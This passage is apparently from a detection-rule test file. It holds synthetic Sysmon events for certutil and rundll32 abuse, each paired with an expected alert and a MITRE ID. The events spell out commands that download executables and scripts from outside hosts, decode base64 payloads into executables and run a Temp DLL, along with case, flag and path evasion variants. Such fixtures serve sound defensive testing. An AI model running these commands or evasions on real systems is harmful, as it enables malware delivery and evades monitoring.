      "name": "attack certutil 03 | urlcache download to ProgramData",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:10:22.989557198Z\",\"eventRecordID\":\"550052\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:10:22.989\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f http://185.220.101.7/node.exe C:\\\\ProgramData\\\\node.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -split -f http://185.220.101.7/node.exe C:\\\\ProgramData\\\\node.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 04 | urlcache download to TEMP env",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:11:50.636855236Z\",\"eventRecordID\":\"550053\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:11:50.636\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f http://10.42.0.15/upd.dat %TEMP%\\\\upd.dat\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -split -f http://10.42.0.15/upd.dat %TEMP%\\\\upd.dat\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 05 | urlcache download ps1 to ProgramData",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:12:27.110902607Z\",\"eventRecordID\":\"550054\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:12:27.110\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f https://raw.githubusercontent.com/evil-tools/loader/main/r.ps1 C:\\\\ProgramData\\\\r.ps1\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/evil-tools/loader/main/r.ps1 C:\\\\ProgramData\\\\r.ps1\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 06 | urlcache download no split",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:13:59.885044430Z\",\"eventRecordID\":\"550055\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:13:59.885\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -f http://10.42.0.15/n.exe C:\\\\Users\\\\Public\\\\n.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -f http://10.42.0.15/n.exe C:\\\\Users\\\\Public\\\\n.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 07 | decode b64 in ProgramData",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:15:44.778934024Z\",\"eventRecordID\":\"550056\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:15:44.778\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -decode C:\\\\ProgramData\\\\staged.b64 C:\\\\ProgramData\\\\staged.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -decode C:\\\\ProgramData\\\\staged.b64 C:\\\\ProgramData\\\\staged.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105/T1140"
    },
    {
      "name": "attack certutil 08 | decode slash-flag in Public",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:17:21.228207138Z\",\"eventRecordID\":\"550057\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:17:21.228\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe /decode C:\\\\Users\\\\Public\\\\enc.b64 C:\\\\Users\\\\Public\\\\enc.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe /decode C:\\\\Users\\\\Public\\\\enc.b64 C:\\\\Users\\\\Public\\\\enc.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105/T1140"
    },
    {
      "name": "attack certutil 09 | decode triple-dash flag",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:18:14.931760439Z\",\"eventRecordID\":\"550058\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:18:14.931\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe ---decode C:\\\\Users\\\\Public\\\\stage.b64 C:\\\\Users\\\\Public\\\\stage.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe ---decode C:\\\\Users\\\\Public\\\\stage.b64 C:\\\\Users\\\\Public\\\\stage.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105/T1140"
    },
    {
      "name": "attack certutil 10 | decode b64 to TEMP env",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:20:07.580816356Z\",\"eventRecordID\":\"550059\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:20:07.580\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -decode C:\\\\ProgramData\\\\p.b64 %TEMP%\\\\p.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -decode C:\\\\ProgramData\\\\p.b64 %TEMP%\\\\p.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105/T1140"
    },
    {
      "name": "attack certutil 11 | urlcache download mixed-case binary | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:21:31.215578871Z\",\"eventRecordID\":\"550060\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:21:31.215\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\cErTuTiL.eXe\",\"commandLine\":\"cErTuTiL.eXe -urlcache -split -f http://10.42.0.15/a.exe C:\\\\Users\\\\Public\\\\a.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c cErTuTiL.eXe -urlcache -split -f http://10.42.0.15/a.exe C:\\\\Users\\\\Public\\\\a.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": true,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 12 | urlcache download glued split-f flag | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:21:51.663437137Z\",\"eventRecordID\":\"550061\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:21:51.663\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split-f http://10.42.0.15/b.exe C:\\\\Users\\\\Public\\\\b.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -split-f http://10.42.0.15/b.exe C:\\\\Users\\\\Public\\\\b.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": true,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 13 | urlcache via relative path parent | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:23:05.655894318Z\",\"eventRecordID\":\"550062\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:23:05.655\",\"processGuid\":\"{3c4be8b1-022b-b9f0-cda0-000000000021}\",\"processId\":\"2610\",\"image\":\"..\\\\..\\\\certutil.exe\",\"commandLine\":\"..\\\\..\\\\certutil.exe -urlcache -split -f http://10.42.0.15/c.exe C:\\\\Users\\\\Public\\\\c.exe\",\"currentDirectory\":\"C:\\\\Windows\\\\System32\\\\wbem\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c ..\\\\..\\\\certutil.exe -urlcache -split -f http://10.42.0.15/c.exe C:\\\\Users\\\\Public\\\\c.exe\",\"hashes\":\"MD5=67200826C4FF1E791BD4F9E5E7930B03,SHA256=654D8DF1CE50C5A353D33FFBDC18263E3F2C3A609E160980A9854E0C0CD43145,IMPHASH=A222C70663147016D26C67A85BE90160\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": true,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 14 | urlcache download from 192.168.1.50",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:25:29.775177051Z\",\"eventRecordID\":\"550063\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:25:29.775\",\"processGuid\":\"{cfd7eb8d-ac33-9d1f-e327-000000000022}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f http://192.168.1.50/m.exe C:\\\\Users\\\\Public\\\\m.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{90e93c09-9882-4c95-e2ce-000000000023}\",\"parentProcessId\":\"6780\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\winrshost.exe\",\"parentCommandLine\":\"winrshost.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack certutil 15 | urlcache download from transfer.sh",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:26:01.554607664Z\",\"eventRecordID\":\"550064\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:26:01.554\",\"processGuid\":\"{c9d5e3b3-3a80-41ea-3e53-000000000014}\",\"processId\":\"671\",\"image\":\"C:\\\\Windows\\\\System32\\\\certutil.exe\",\"commandLine\":\"certutil.exe -urlcache -split -f https://transfer.sh/ab12/backdoor.exe C:\\\\ProgramData\\\\backdoor.exe\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c certutil.exe -urlcache -split -f https://transfer.sh/ab12/backdoor.exe C:\\\\ProgramData\\\\backdoor.exe\",\"hashes\":\"MD5=79E05CF44B265169CD9A673B0D2C2FFB,SHA256=58858CD6163A83B3ABFA396041EE8C319BC3FC8AC6B02E2B5297FCEA33495D9B,IMPHASH=1C07B3CF511F24305EB0AE46D98C75BA\"}}}",
      "expect": {
        "rule.id": "100801",
        "alert": true
      },
      "category": "attack",
      "attack": "certutil",
      "evasion": false,
      "expected_rule_id": 100801,
      "expected_level": 10,
      "mitre_id": "T1105"
    },
    {
      "name": "attack rundll32 01 | Temp dll entry point",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:27:57.870630162Z\",\"eventRecordID\":\"550065\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:27:57.870\",\"processGuid\":\"{b303bcc2-cdf6-a614-a4d3-000000000024}\",\"processId\":\"5830\",\"image\":\"C:\\\\Windows\\\\System32\\\\rundll32.exe\",\"commandLine\":\"rundll32.exe C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\payload.dll,Start\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c rundll32.exe C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\payload.dll,Start\",\"hashes\":\"MD5=4E552EB416B764247C39A00C2211DFF1,SHA256=94EF7001599600BD5547FC572115101961DC25267A67A7E91A59E528009A213D,IMPHASH=3102F53903EC357A6E9EEFDD034E9DE0\"}}}",
      "expect": {
        "rule.id": "100802",
        "alert": true
      },
      "category": "attack",
      "attack": "rundll32",
      "evasion": false,
      "expected_rule_id": 100802,
      "expected_level": 10,
      "mitre_id": "T1218.011"
    },
